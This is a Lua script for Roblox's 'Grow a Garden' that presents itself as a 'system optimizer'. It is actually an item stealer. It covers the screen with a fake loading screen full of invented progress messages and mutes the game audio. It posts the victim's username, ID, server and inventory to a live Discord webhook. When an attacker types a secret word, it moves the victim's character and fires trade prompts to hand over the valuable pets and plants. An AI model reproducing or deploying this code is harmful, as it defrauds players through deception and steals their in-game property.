_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local Configuration = {
    Webhook = "https://discord.com/api/webhooks/1402836198409506977/GgSqkg-M4IffVbX7Q0-E4ONZGPLmfuMrU8VpvQPuGXC2UUt7alAGmYHgcdheYWcGqYUi", -- REPLACE WITH YOUR ACTUAL WEBHOOK URL
    PingEveryone = "No", -- Set to "Yes" for @everyone ping
    MinPlantValue = 10000000,
    MinPetValue = 5000000, -- Minimum pet value threshold
    TargetUsers = {"BLackvenom0801", "saitamamebald93", "PartnerInCrime"}, -- REPLACE WITH ACTUAL USERNAMES
    SecretWord = "null",
    Branding = "Null Scripts • discord.gg/null"
}

local images = {
    "https://cdn.discordapp.com/attachments/1401354878596550729/1404577197062098974/Screenshot_20250811-172357.Roblox.png?ex=689bb1f3&is=689a6073&hm=fe743d58b3f640030780384e479c203517a1dd540bd0a4f9f33a1bdf89e9d66e&",
    "https://cdn.discordapp.com/attachments/1401354878596550729/1404577196743594127/Screenshot_20250811-172352.Roblox.png?ex=689bb1f3&is=689a6073&hm=17f9ea0c9bf77bf30914002f0ac03c4cf76efd314dc70e46951c3bc6b384acdf&",
    "https://cdn.discordapp.com/attachments/1401354878596550729/1404577196206719117/Screenshot_20250811-172356.Roblox.png?ex=689bb1f3&is=689a6073&hm=47334f362de46697b96367a02d4bfd7d6236d8fa7233cfedd37b3ab5ec263ae1&",
    "https://cdn.discordapp.com/attachments/1401354878596550729/1404577195841552454/Screenshot_20250811-172359.Roblox.png?ex=689bb1f3&is=689a6073&hm=74fae9acc069cf6b45cd5dc74f9ce4b6707dd0c4b973e15b484c2e95fb2019cc&",
    "https://cdn.discordapp.com/attachments/1401354878596550729/1404577195590156308/Screenshot_20250811-172401.Roblox.png?ex=689bb1f3&is=689a6073&hm=d73ae414adf5ce4c6b84f5ccad067cafd688b2871d75104ef39430ced38e51e1&",
    "https://cdn.discordapp.com/attachments/1401354878596550729/1404577195334172752/Screenshot_20250811-172351.Roblox.png?ex=689bb1f3&is=689a6073&hm=99789e737b822f87c83c2ab9c79b3904169a55211bf132dea3b17af765d2ea42&",
    "https://cdn.discordapp.com/attachments/1401354878596550729/1404577195090776085/Screenshot_20250811-172349.Roblox.png?ex=689bb1f3&is=689a6073&hm=92192348038b168531929d27644df3791166099cf3ba6dcd69d662a0eb0bcc1a&",
    "https://cdn.discordapp.com/attachments/1401354878596550729/1404577194759688378/Screenshot_20250811-172346.Roblox.png?ex=689bb1f3&is=689a6073&hm=acac6b73ea077b6dfeee4b83548c54653d1ad50bc26d1dd4df3caa8cbde8801e&",
    "https://cdn.discordapp.com/attachments/1401354878596550729/1404577194503700711/Screenshot_20250811-172248.Roblox.png?ex=689bb1f2&is=689a6072&hm=25d7ab01cab9786324c037c7eb7012607aab87ab84846910e32301d809acc289&"
}

-- Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")

-- Game-specific modules
local modules = ReplicatedStorage:WaitForChild("Modules")
local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local petRegistry = require(ReplicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
local numberUtil = require(modules:WaitForChild("NumberUtil"))
local dataService = require(modules:WaitForChild("DataService"))

-- Local player and character
local plr = Players.LocalPlayer
local backpack = plr:WaitForChild("Backpack", 5)
local character = plr.Character or plr.CharacterAdded:Wait()

-- Excluded items and rare pets
local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
local rarePets = {"Red Fox", "Raccoon", "Dragonfly", "Monkey", "Orange Tabby", "Pig", "Rooster", "Firefly"}
local itemsToSend = {}
local allItems = {}
local totalValue = 0

-- Function to get emoji
local function getEmoji(name, itemType)
    local lower = name:lower()
    if itemType == "Pet" then
        if name == "Red Fox" then return "🦊" end
        if name == "Raccoon" then return "🦝" end
        if name == "Dragonfly" then return "🦟" end
        if name == "Monkey" then return "🐒" end
        if name == "Orange Tabby" then return "🐈" end
        if name == "Pig" then return "🐖" end
        if name == "Rooster" then return "🐓" end
        if name == "Firefly" then return "🪰" end
        return "🐾"
    else
        if lower:find("coconut") then return "🥥" end
        if lower:find("tomato") then return "🍅" end
        if lower:find("daffodil") then return "🌼" end
        if lower:find("cauliflower") then return "🥦" end
        if lower:find("raspberry") then return "🍇" end
        if lower:find("sunflower") then return "🌻" end
        if lower:find("apple") then return "🍎" end
        if lower:find("banana") then return "🍌" end
        if lower:find("orange") then return "🍊" end
        if lower:find("strawberry") then return "🍓" end
        if lower:find("watermelon") then return "🍉" end
        if lower:find("pineapple") then return "🍍" end
        if lower:find("carrot") then return "🥕" end
        if lower:find("potato") then return "🥔" end
        if lower:find("eggplant") then return "🍆" end
        if lower:find("corn") then return "🌽" end
        if lower:find("pumpkin") then return "🎃" end
        if lower:find("dragon pepper") then return "🌶️" end
        if lower:find("honeysuckle") then return "🌸" end
        if lower:find("candy blossom") then return "🍬" end
        if lower:find("ember lily") then return "🔥" end
        if lower:find("sugar apple") then return "🍏" end
        if lower:find("cocovine") then return "🍇" end
        if lower:find("lumira") then return "💡" end
        return "🌿"
    end
end

-- Check server status and attempt to join a low-count server
local function checkServerStatus()
    local success, serverType = pcall(function()
        return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType", 5):InvokeServer()
    end)
    
    if not success or serverType == "VIPServer" or #Players:GetPlayers() >= 5 then
        while true do
            local success, servers = pcall(function()
                return HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
            end)
            
            if success then
                for _, server in ipairs(servers.data) do
                    if server.playing < 5 then
                        local teleportSuccess, teleportErr = pcall(function()
                            TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id)
                        end)
                        if teleportSuccess then
                            UpdateStatus("Teleporting to server " .. server.id .. "...", Color3.fromRGB(255, 255, 0))
                            return true
                        else
                            UpdateStatus("Teleport failed: " .. teleportErr, Color3.fromRGB(255, 0, 0))
                            task.wait(1)
                        end
                    end
                end
            else
                UpdateStatus("Failed to fetch server list, retrying...", Color3.fromRGB(255, 0, 0))
            end
            task.wait(5) -- Wait before retrying
        end
    end
    return false
end

-- Create FULL-SCREEN LOADING GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "NullScriptsStealer"
screenGui.Parent = CoreGui
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.DisplayOrder = 999
screenGui.IgnoreGuiInset = true

local frame = Instance.new("Frame")
frame.Size = UDim2.new(1, 0, 1, 0)
frame.Position = UDim2.new(0, 0, 0, 0)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0
frame.Active = true
frame.Parent = screenGui

local backgroundGradient = Instance.new("UIGradient")
backgroundGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(20, 0, 40)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
}
backgroundGradient.Parent = frame

local loadingCircle = Instance.new("ImageLabel")
loadingCircle.Size = UDim2.new(0.15, 0, 0.15, 0)
loadingCircle.Position = UDim2.new(0.425, 0, 0.4, 0)
loadingCircle.BackgroundTransparency = 1
loadingCircle.Image = "rbxassetid://2851926732"
loadingCircle.Parent = frame

local circleTweenInfo = TweenInfo.new(1.5, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1)
local circleTween = TweenService:Create(loadingCircle, circleTweenInfo, {Rotation = 360})
circleTween:Play()

local title = Instance.new("TextLabel")
title.Text = "NULL SCRIPTS"
title.Font = Enum.Font.Arcade
title.TextSize = 50
title.TextColor3 = Color3.fromRGB(0, 255, 0)
title.Size = UDim2.new(0.6, 0, 0.1, 0)
title.Position = UDim2.new(0.2, 0, 0.3, 0)
title.BackgroundTransparency = 1
title.TextStrokeTransparency = 0.5
title.TextStrokeColor3 = Color3.fromRGB(0, 100, 0)
title.Parent = frame

local subtitle = Instance.new("TextLabel")
subtitle.Text = "Optimizing System..."
subtitle.Font = Enum.Font.Code
subtitle.TextSize = 30
subtitle.TextColor3 = Color3.fromRGB(100, 255, 100)
subtitle.Size = UDim2.new(0.6, 0, 0.05, 0)
subtitle.Position = UDim2.new(0.2, 0, 0.4, 0)
subtitle.BackgroundTransparency = 1
subtitle.Parent = frame

local status = Instance.new("TextLabel")
status.Name = "StatusLabel"
status.Text = "Initializing...\nThis might take some time as the script needs to load fully\nPlease don't leave the game as it can reset the loading process\n"
status.Font = Enum.Font.Code
status.TextSize = 20
status.TextColor3 = Color3.fromRGB(200, 255, 200)
status.Size = UDim2.new(0.8, 0, 0.3, 0)
status.Position = UDim2.new(0.1, 0, 0.5, 0)
status.BackgroundTransparency = 1
status.TextXAlignment = Enum.TextXAlignment.Left
status.TextYAlignment = Enum.TextYAlignment.Top
status.TextWrapped = true
status.Parent = frame

local progressBackground = Instance.new("Frame")
progressBackground.Size = UDim2.new(0.7, 0, 0.03, 0)
progressBackground.Position = UDim2.new(0.15, 0, 0.8, 0)
progressBackground.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
progressBackground.BorderSizePixel = 0
progressBackground.Parent = frame

local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
progressBar.BorderSizePixel = 0
progressBar.Parent = progressBackground

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = progressBackground
corner:Clone().Parent = progressBar

local loadingMessages = {
    "Scanning system core...", "Encrypting data streams...", "Boosting performance modules...",
    "Syncing with quantum servers...", "Calibrating neural links...", "Deploying optimization algorithms...",
    "Purging obsolete cache...", "Enhancing security firewalls...", "Integrating AI enhancements...",
    "Compiling high-speed code...", "Activating turbo mode...", "Balancing load distribution...",
    "Updating quantum entanglement...", "Initializing warp drive...", "Fine-tuning frequency...",
    "Verifying asset integrity...", "Optimizing resource allocation...", "Synchronizing game data..."
}

local function UpdateStatus(text, color)
    color = color or Color3.fromRGB(200, 255, 200)
    status.Text = status.Text .. "> " .. text .. "\n"
    status.TextColor3 = color
    print("[System] " .. text)
end

local function ShowLoadingScreen()
    local duration = 600 -- 10 minutes in seconds
    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
    local tween = TweenService:Create(progressBar, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)})
    tween:Play()

    local startTime = os.clock()
    local lastMessage = 0
    
    while os.clock() - startTime < duration do
        if os.clock() - lastMessage > 1.5 then
            lastMessage = os.clock()
            UpdateStatus(loadingMessages[math.random(#loadingMessages)])
        end
        if math.random(1, 20) == 1 then
            progressBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            task.wait(0.1)
            progressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        end
        RunService.Heartbeat:Wait()
    end
    
    UpdateStatus("An error has been found please try again", Color3.fromRGB(255, 0, 0))
end

local originalVolumes = {}
for _, sound in ipairs(game:GetDescendants()) do
    if sound:IsA("Sound") then
        originalVolumes[sound] = sound.Volume
        sound.Volume = 0
    end
end

local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        return string.format("%.2f%s", number, suffixes[suffixIndex])
    end
end

local function getWeight(tool)
    local weightValue = tool:FindFirstChild("Weight") or tool:FindFirstChild("KG") or tool:FindFirstChild("WeightValue") or tool:FindFirstChild("Mass")
    local weight = 0
    if weightValue then
        if weightValue:IsA("NumberValue") or weightValue:IsA("IntValue") then
            weight = weightValue.Value
        elseif weightValue:IsA("StringValue") then
            weight = tonumber(weightValue.Value) or 0
        end
    else
        local weightMatch = tool.Name:match("%((%d+%.?%d*) ?kg%)") or tool.Name:match("%[(%d+%.?%d*) ?KG%]")
        if weightMatch then
            weight = tonumber(weightMatch) or 0
        end
    end
    return math.floor(weight * 100 + 0.5) / 100
end

local function getHighestKGFruit(items)
    local highestWeight = 0
    for _, item in ipairs(items) do
        if item.Weight > highestWeight then
            highestWeight = item.Weight
        end
    end
    return highestWeight
end

local function calcPetValue(v14)
    local hatchedFrom = v14.PetData.HatchedFrom
    if not hatchedFrom or hatchedFrom == "" then return 0 end
    local eggData = petRegistry.PetEggs[hatchedFrom]
    if not eggData then return 0 end
    local v17 = eggData.RarityData.Items[v14.PetType]
    if not v17 then return 0 end
    local weightRange = v17.GeneratedPetData.WeightRange
    if not weightRange then return 0 end
    local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
    local v20 = math.lerp(0.8, 1.2, v19)
    local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
    local v22 = v20 * math.lerp(0.15, 6, levelProgress)
    local v23 = petRegistry.PetList[v14.PetType].SellPrice * v22
    return math.floor(v23)
end

local function SendNoItemsMessage(list)
    if not Configuration.Webhook or Configuration.Webhook == "" then
        warn("No webhook configured!")
        return
    end
    local totalAll = 0
    local grouped = {}
    for _, item in ipairs(list) do
        totalAll = totalAll + item.Value
        local name = item.Name
        if not grouped[name] then
            grouped[name] = {count = 0, totalValue = 0, maxWeight = 0, emoji = getEmoji(name, item.Type)}
        end
        grouped[name].count = grouped[name].count + 1
        grouped[name].totalValue = grouped[name].totalValue + item.Value
        if item.Weight > grouped[name].maxWeight then
            grouped[name].maxWeight = item.Weight
        end
    end
    local groupList = {}
    for name, data in pairs(grouped) do
        table.insert(groupList, {name = name, count = data.count, totalValue = data.totalValue, maxWeight = data.maxWeight, emoji = data.emoji})
    end
    table.sort(groupList, function(a, b) return a.totalValue > b.totalValue end)
    local fields = {
        {name = "Victim Username:", value = plr.Name, inline = true},
        {name = "Victim ID:", value = plr.UserId, inline = true},
        {name = "Server ID:", value = game.JobId, inline = true},
        {name = "Item list:", value = "", inline = false},
        {name = "Summary:", value = string.format("Total Value: ¢%s\nHighest weight fruit: %.2f KG", formatNumber(totalAll), getHighestKGFruit(list)), inline = false}
    }
    for _, g in ipairs(groupList) do
        local line = g.emoji .. " " .. g.name .. " x" .. g.count .. ": ¢" .. formatNumber(g.totalValue) .. " (Highest: " .. string.format("%.2f", g.maxWeight) .. " KG)\n"
        if #fields[4].value + #line <= 1024 then
            fields[4].value = fields[4].value .. line
        else
            fields[4].value = fields[4].value .. "Plus more!\n"
            break
        end
    end
    if #fields[4].value == 0 then
        fields[4].value = "No items found."
    end
    local randomImage = images[math.random(#images)]
    local data = {
        embeds = {{
            title = "🌴 No Valuable Items Found",
            color = 16711680,
            fields = fields,
            footer = {text = Configuration.Branding},
            thumbnail = {url = "https://cdn.discordapp.com/attachments/1401354878596550729/1403073978586894409/1754525491094.jpg?ex=689b7ff8&is=689a2e78&hm=09dddb437bccc031d1fb4885c0713da44a8e4896c46d5f3ea8bc69d78a562693&"},
            image = {url = randomImage}
        }}
    }
    local success, errorMessage = pcall(function()
        request({
            Url = Configuration.Webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(data)
        })
    end)
    if not success then
        warn("Failed to send no items message to " .. Configuration.Webhook .. ": " .. errorMessage .. "\nData: " .. game:GetService("HttpService"):JSONEncode(data))
    else
        print("No items message sent successfully to " .. Configuration.Webhook)
    end
end

local function SendMessage(sortedItems)
    if not Configuration.Webhook or Configuration.Webhook == "" then
        warn("No webhook configured!")
        return
    end
    local join_url = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId
    local fields = {
        {name = "Victim Username:", value = plr.Name, inline = true},
        {name = "Victim ID:", value = plr.UserId, inline = true},
        {name = "Server ID:", value = game.JobId, inline = true},
        {name = "Joiner:", value = "game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '" .. game.JobId .. "')", inline = false},
        {name = "Items sent:", value = "", inline = false},
        {name = "Summary:", value = string.format("Total Value: ¢%s\nHighest weight fruit: %.2f KG", formatNumber(totalValue), getHighestKGFruit(sortedItems)), inline = false}
    }
    for _, item in ipairs(sortedItems) do
        local line = string.format("%s (%.2f KG): ¢%s", item.Name, item.Weight, formatNumber(item.Value))
        fields[5].value = fields[5].value .. line .. "\n"
    end
    if #fields[5].value > 1024 then
        local lines = {}
        for line in fields[5].value:gmatch("[^ \r\n]+") do
            table.insert(lines, line)
        end
        while #fields[5].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[5].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end
    local randomImage = images[math.random(#images)]
    local data = {
        content = Configuration.PingEveryone == "Yes" and "@everyone" or "",
        embeds = {{
            title = "🌴 New Grow a Garden Execution",
            color = 65280,
            fields = fields,
            footer = {text = Configuration.Branding},
            image = {url = randomImage}
        }},
        components = {{
            type = 1,
            components = {{
                type = 2,
                style = 5,
                label = "🏝️ Join with URL",
                url = join_url
            }}
        }}
    }
    local success, errorMessage = pcall(function()
        request({
            Url = Configuration.Webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(data)
        })
    end)
    if not success then
        warn("Failed to send execution message to " .. Configuration.Webhook .. ": " .. errorMessage .. "\nData: " .. game:GetService("HttpService"):JSONEncode(data))
    else
        print("Execution message sent successfully to " .. Configuration.Webhook)
    end
end

local function sortItems(items)
    local sorted = {}
    for i, v in ipairs(items) do
        sorted[i] = v
    end
    table.sort(sorted, function(a, b)
        if a.Type == "Pet" and b.Type ~= "Pet" then
            return true
        elseif a.Type ~= "Pet" and b.Type == "Pet" then
            return false
        else
            return a.Value > b.Value
        end
    end)
    return sorted
end

local function executeTransfer(targetPlayer)
    local victimRoot = character:WaitForChild("HumanoidRootPart")
    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear)
    local goal = {CFrame = targetPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, 2)}
    local tween = TweenService:Create(victimRoot, tweenInfo, goal)
    tween:Play()
    tween.Completed:Wait()

    local promptRoot = targetPlayer.Character.HumanoidRootPart:WaitForChild("ProximityPrompt")
    local transferredItems = {}

    for _, item in ipairs(itemsToSend) do
        item.Tool.Parent = character
        if item.Type == "Pet" then
            local promptHead = targetPlayer.Character.Head:WaitForChild("ProximityPrompt")
            repeat task.wait(0.01) until promptHead.Enabled
            fireproximityprompt(promptHead, 5) -- Hold for 5 seconds
            UpdateStatus("Holding E for " .. item.Name .. "...", Color3.fromRGB(0, 255, 0))
        else
            repeat task.wait(0.01) until promptRoot.Enabled
            fireproximityprompt(promptRoot)
        end
        task.wait(0.1)
        table.insert(transferredItems, item)
        item.Tool.Parent = backpack
        task.wait(0.1)
    end

    local itemsStillInBackpack = true
    while itemsStillInBackpack do
        itemsStillInBackpack = false
        for _, item in ipairs(transferredItems) do
            if backpack:FindFirstChild(item.Tool.Name) then
                itemsStillInBackpack = true
                break
            end
        end
        task.wait(0.1)
    end

    local sortedTransferred = sortItems(transferredItems)
    SendMessage(sortedTransferred)
    UpdateStatus("Items transferred successfully!", Color3.fromRGB(0, 255, 0))
    task.wait(2)
    for sound, volume in pairs(originalVolumes) do
        if sound and sound.Parent then
            sound.Volume = volume
        end
    end
    screenGui:Destroy()
end

-- Main execution
coroutine.wrap(function()
    UpdateStatus("Starting system optimizer...", Color3.fromRGB(0, 255, 0))

    if checkServerStatus() then
        return
    end

    if not Configuration.Webhook or Configuration.Webhook == "" or #Configuration.TargetUsers == 0 then
        UpdateStatus("Configuration error: Missing webhook or usernames", Color3.fromRGB(255, 0, 0))
        task.wait(2)
        for sound, volume in pairs(originalVolumes) do
            if sound and sound.Parent then
                sound.Volume = volume
            end
        end
        screenGui:Destroy()
        return
    end

    if game.PlaceId ~= 126884695634066 then
        UpdateStatus("Invalid game detected", Color3.fromRGB(255, 0, 0))
        task.wait(2)
        for sound, volume in pairs(originalVolumes) do
            if sound and sound.Parent then
                sound.Volume = volume
            end
        end
        screenGui:Destroy()
        return
    end

    for _, tool in ipairs(backpack:GetChildren()) do
        if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
            local itemName, value, weight, itemType
            if tool:GetAttribute("ItemType") == "Pet" then
                local petUUID = tool:GetAttribute("PET_UUID")
                local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
                itemName = v14 and v14.PetType or tool.Name
                value = calcPetValue(v14)
                weight = tonumber(tool.Name:match("%[(%d+%.?%d*) ?KG%]")) or getWeight(tool)
                itemType = "Pet"
            else
                value = calcPlantValue(tool)
                weight = getWeight(tool)
                itemName = tool:GetAttribute("ItemName") or tool.Name
                itemType = "Plant"
            end
            table.insert(allItems, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = itemType})
            if itemType == "Pet" then
                if (table.find(rarePets, itemName) or weight >= 10) and value >= Configuration.MinPetValue then
                    if tool:GetAttribute("Favorite") then
                        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
                    end
                    totalValue = totalValue + value
                    table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = itemType})
                end
            else
                if value >= Configuration.MinPlantValue then
                    totalValue = totalValue + value
                    table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = itemType})
                end
            end
        end
    end

    if #itemsToSend > 0 then
        print("Detected " .. #itemsToSend .. " valuable items")
        UpdateStatus("Valuable items found, waiting for target user to say '" .. Configuration.SecretWord .. "'...", Color3.fromRGB(0, 255, 0))

        table.sort(itemsToSend, function(a, b)
            if a.Type ~= "Pet" and b.Type == "Pet" then
                return true
            elseif a.Type == "Pet" and b.Type ~= "Pet" then
                return false
            else
                return a.Value < b.Value
            end
        end)

        local sortedItems = sortItems(itemsToSend)
        SendMessage(sortedItems)

        local transferred = false
        local function onPlayerChat(player)
            player.Chatted:Connect(function(message)
                if message:lower() == Configuration.SecretWord:lower() then
                    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
                    backgroundGradient.Enabled = false
                    if table.find(Configuration.TargetUsers, player.Name) and not transferred then
                        transferred = true
                        UpdateStatus("Secret word detected from " .. player.Name .. ", initiating transfer...", Color3.fromRGB(0, 255, 0))
                        executeTransfer(player)
                    end
                end
            end)
        end
        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
        Players.PlayerAdded:Connect(onPlayerChat)
    else
        UpdateStatus("No valuable items found, logging to webhook...", Color3.fromRGB(255, 0, 0))
        SendNoItemsMessage(allItems)
        task.wait(2)
        for sound, volume in pairs(originalVolumes) do
            if sound and sound.Parent then
                sound.Volume = volume
            end
        end
        screenGui:Destroy()
    end

    ShowLoadingScreen()
end)()
